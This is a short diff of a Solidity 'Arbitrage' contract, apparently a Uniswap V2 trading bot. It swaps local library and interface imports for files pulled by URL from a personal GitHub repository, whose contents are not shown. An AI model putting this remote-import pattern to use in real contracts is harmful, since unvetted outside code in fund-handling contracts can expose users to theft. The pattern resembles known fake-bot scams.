@@ -1,11 +1,13 @@
 pragma solidity ^0.6.6;
 
-import './UniswapV2Library.sol';
-import './interfaces/IUniswapV2Router02.sol';
-import './interfaces/IUniswapV2Pair.sol';
-import './interfaces/IUniswapV2Factory.sol';
-import './interfaces/IERC20.sol';
-import './SafeMath.sol';
+import " https://github.com/ibiinc1/ibiinc1/blob/main/interfaces/IERC20.sol";
+import " https://github.com/ibiinc1/ibiinc1/blob/main/interfaces/IUniswapV2Callee.sol";
+import " https://github.com/ibiinc1/ibiinc1/blob/main/interfaces/IUniswapV2Factory.sol";
+import " https://github.com/ibiinc1/ibiinc1/blob/main/interfaces/IUniswapV2Pair.sol";
+import " https://github.com/ibiinc1/ibiinc1/blob/main/interfaces/IUniswapV2Router01.sol";
+import " https://github.com/ibiinc1/ibiinc1/blob/main/interfaces/IUniswapV2Router02.sol";
+import " https://github.com/ibiinc1/ibiinc1/blob/main/SafeMath.sol";
+import " https://github.com/ibiinc1/ibiinc1/blob/main/UniswapV2Library.sol";
 
 contract Arbitrage {
 using SafeMath for uint;
